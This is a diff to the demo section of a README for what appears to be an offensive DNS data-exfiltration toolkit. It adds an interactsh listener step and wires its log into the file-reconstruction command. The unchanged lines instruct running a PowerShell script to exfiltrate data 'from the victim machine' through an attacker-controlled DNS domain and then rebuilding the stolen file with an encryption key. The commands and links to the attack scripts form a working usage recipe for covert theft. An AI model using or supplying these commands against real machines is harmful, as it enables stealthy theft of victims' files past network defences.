@@ -10,6 +10,12 @@
 
 ## Demo
 
+- Run [https://github.com/projectdiscovery/interactsh](https://github.com/projectdiscovery/interactsh):
+
+```bash
+./interactsh-client -o logs.txt
+```
+
 - To exfiltrate data from the victim machine, first run [https://github.com/Unit-259/dataBouncing/blob/main/nightCrawler.ps1](https://github.com/Unit-259/dataBouncing/blob/main/nightCrawler.ps1):
 
 ```powershell
@@ -20,5 +26,5 @@ Invoke-NightCrawler -Identifier "LifeIsSad" -Domain "YourDNSControlledDomainForO
 - To reconstruct the exfiltrated file, run [https://github.com/Unit-259/dataBouncing/blob/main/deadPool.ps1](https://github.com/Unit-259/dataBouncing/blob/main/deadPool.ps1):
 
 ```powershell
-Invoke-DeadPool -LogFile "PathToFileWithDNSRequestsLogs" -Identifier "LifeIsSad" -EncryptionEnabled -EncryptionKey "SadIsLife" -OutputFile "PathToFileWhereToSaveExfiltrated"
+Invoke-DeadPool -LogFile "logs.txt" -Identifier "LifeIsSad" -EncryptionEnabled -EncryptionKey "SadIsLife" -OutputFile "PathToFileWhereToSaveExfiltrated"
 ```
